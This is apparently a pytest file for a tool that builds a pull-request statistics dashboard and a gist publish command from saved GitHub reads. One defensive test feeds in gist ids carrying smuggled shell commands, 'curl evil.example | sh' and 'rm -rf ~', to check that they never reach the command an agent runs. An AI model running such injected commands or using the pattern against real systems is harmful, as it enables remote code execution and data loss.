# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
"""`pr-management stats build` from saved reads."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

from pr_management import cli
from pr_management.stats import build

NOW = datetime(2026, 5, 29, 12, 0, tzinfo=UTC)


def _open_pr(n: int, *, labels=(), created="2026-04-01T00:00:00Z", files=()) -> dict[str, Any]:
    return {
        "number": n,
        "title": f"PR {n}",
        "isDraft": False,
        "createdAt": created,
        "updatedAt": created,
        "body": "",
        "author": {"login": f"c{n}", "__typename": "User"},
        "authorAssociation": "CONTRIBUTOR",
        "baseRefName": "main",
        "labels": {"nodes": [{"name": x} for x in labels]},
        "commits": {"nodes": [{"commit": {"oid": "abc1234", "committedDate": created}}]},
        "files": {"nodes": [{"path": p} for p in files]},
        "comments": {"nodes": []},
        "latestReviews": {"nodes": []},
        "reviewThreads": {"nodes": []},
        "timelineItems": {"nodes": []},
    }


def _closed_pr(n: int, closed: str) -> dict[str, Any]:
    return {
        "number": n,
        "title": f"PR {n}",
        "isDraft": False,
        "createdAt": "2026-04-01T00:00:00Z",
        "closedAt": closed,
        "updatedAt": closed,
        "mergedAt": closed,
        "merged": True,
        "state": "MERGED",
        "body": "",
        "author": {"login": f"c{n}"},
        "authorAssociation": "CONTRIBUTOR",
        "baseRefName": "main",
        "labels": {"nodes": []},
        "comments": {"nodes": []},
        "timelineItems": {"nodes": []},
    }


@pytest.fixture()
def project(tmp_path: Path) -> Path:
    root = tmp_path / "repo"
    (root / ".git").mkdir(parents=True)
    (root / ".github").mkdir()
    (root / ".github" / "CODEOWNERS").write_text("/src/ @owner1\n")
    (root / ".apache-magpie-overrides").mkdir()
    (root / ".apache-magpie-overrides" / "project.md").write_text("| `upstream_repo` | `acme/product` |\n")
    return root


def _save_open(saved: Path, *prs: dict[str, Any], count: int | None = None) -> None:
    page = {"data": {"search": {"issueCount": count if count is not None else len(prs), "nodes": list(prs)}}}
    (saved / "stats-open.json").write_text(json.dumps([page]))


def _save_closed(saved: Path, k: int, prs: list[dict[str, Any]], *, more: bool, cursor: str = "CUR") -> None:
    conn = {"pageInfo": {"hasNextPage": more, "endCursor": cursor}, "nodes": prs}
    (saved / f"stats-closed-page-{k}.json").write_text(
        json.dumps({"data": {"repository": {"pullRequests": conn}}})
    )


def _build(project: Path, saved: Path, **kw: Any) -> dict[str, Any]:
    return build.build(
        project_root=project,
        config_dir=None,
        saved=saved,
        viewer="me",
        out=project / "out" / "dashboard.html",
        since=None,
        now=NOW,
        **kw,
    )


def test_missing_reads_come_back_as_needs(project: Path, tmp_path: Path) -> None:
    saved = tmp_path / "saved"
    saved.mkdir()
    result = _build(project, saved)
    assert {n["op"] for n in result["needs"]} == {"gql-pr-stats-open", "gql-pr-stats-closed-page"}
    assert result["needs"][1]["params"] == ["start"]


def test_closed_pages_are_asked_for_until_one_predates_the_cutoff(project: Path, tmp_path: Path) -> None:
    saved = tmp_path / "saved"
    saved.mkdir()
    _save_open(saved, _open_pr(1))
    _save_closed(saved, 1, [_closed_pr(9, "2026-05-20T00:00:00Z")], more=True, cursor="Q1VSMQ==")
    result = _build(project, saved)
    assert result["needs"] == [
        {"op": "gql-pr-stats-closed-page", "params": ["Q1VSMQ=="], "save": "stats-closed-page-2.json"}
    ]
    _save_closed(saved, 2, [_closed_pr(8, "2026-03-01T00:00:00Z")], more=True)
    result = _build(project, saved)
    assert "needs" not in result
    assert json.loads((project / "out" / "dashboard.json").read_text())["closed_count"] == 1


def test_a_build_writes_every_panel_and_proposes_a_new_gist(project: Path, tmp_path: Path) -> None:
    saved = tmp_path / "saved"
    saved.mkdir()
    _save_open(saved, _open_pr(1, labels=["ready for maintainer review"], files=["src/a.py"]), _open_pr(2))
    _save_closed(saved, 1, [_closed_pr(9, "2026-05-20T00:00:00Z")], more=False)
    result = _build(project, saved)
    html = (project / "out" / "dashboard.html").read_text()
    for panel in (
        "What needs attention",
        "Reading the dashboard",
        "Methodology",
        "daily snapshot job",
        "Summary:",
    ):
        assert panel in html, panel
    assert result["summary"]["open"] == 2
    assert result["summary"]["line"].startswith("Summary: 2 open")
    assert result["publish"]["gist_id"] is None
    assert result["publish"]["command"].startswith("gh gist create ")


def test_a_recorded_gist_is_updated_in_place(project: Path, tmp_path: Path) -> None:
    saved = tmp_path / "saved"
    saved.mkdir()
    _save_open(saved, _open_pr(1))
    _save_closed(saved, 1, [], more=False)
    assert build.record_gist(project, "abc123def456")["stored"]
    result = _build(project, saved)
    assert result["publish"]["command"].startswith("gh api -X PATCH gists/abc123def456 --input ")
    payload = json.loads(Path(result["publish"]["payload"]).read_text())
    assert "dashboard.html" in payload["files"]


def test_fast_closed_hitting_the_search_cap_is_annotated(project: Path, tmp_path: Path) -> None:
    saved = tmp_path / "saved"
    saved.mkdir()
    _save_open(saved, _open_pr(1))
    closed = [_closed_pr(n, "2026-05-25T00:00:00Z") for n in range(1000)]
    page = {"data": {"search": {"issueCount": 1400, "nodes": closed}}}
    (saved / "stats-closed-search.json").write_text(json.dumps([page]))
    result = _build(project, saved, fast_closed=True)
    assert result["cap_note"] and "cap-truncated" in result["cap_note"]
    assert "cap-truncated" in (project / "out" / "dashboard.html").read_text()


def test_markdown_fallback(project: Path, tmp_path: Path) -> None:
    saved = tmp_path / "saved"
    saved.mkdir()
    _save_open(saved, _open_pr(1))
    _save_closed(saved, 1, [], more=False)
    result = _build(project, saved, fmt="markdown")
    text = (project / "out" / "dashboard.html").read_text()
    assert text.startswith("# acme/product — Maintainer dashboard")
    assert "## Triage funnel" in text and "## Legend" in text
    assert result["publish"] is None


def test_cli_refuses_a_malformed_since(project: Path, tmp_path: Path) -> None:
    with pytest.raises(SystemExit):
        cli.main(
            [
                "--project-root",
                str(project),
                "stats",
                "build",
                "--saved-dir",
                str(tmp_path),
                "--viewer",
                "me",
                "--out",
                str(tmp_path / "d.html"),
                "--since",
                "May 1",
            ]
        )


def test_a_hostile_gist_id_never_reaches_the_command(project: Path, tmp_path: Path) -> None:
    """The session state is agent-writable; its gist id is spliced into a command the agent runs."""
    saved = tmp_path / "saved"
    saved.mkdir()
    _save_open(saved, _open_pr(1))
    _save_closed(saved, 1, [], more=False)
    assert not build.record_gist(project, "abc; curl evil.example | sh")["stored"]
    state = build._state_path(project)
    assert state is not None
    state.parent.mkdir(parents=True, exist_ok=True)
    state.write_text(json.dumps({"stats_gist_id": "abc123; rm -rf ~"}))
    result = _build(project, saved)
    assert result["publish"]["gist_id"] is None
    assert result["publish"]["command"].startswith("gh gist create ")
    assert "rm -rf" not in result["publish"]["command"]
    assert any("not a gist id" in w for w in result["publish"]["warnings"])


def test_the_publish_command_quotes_every_value(project: Path, tmp_path: Path) -> None:
    import shlex

    saved = tmp_path / "saved"
    saved.mkdir()
    _save_open(saved, _open_pr(1))
    _save_closed(saved, 1, [], more=False)
    result = _build(project, saved)
    argv = shlex.split(result["publish"]["command"])
    assert argv[:3] == ["gh", "gist", "create"]
    assert argv[4] == "--desc" and len(argv) == 6
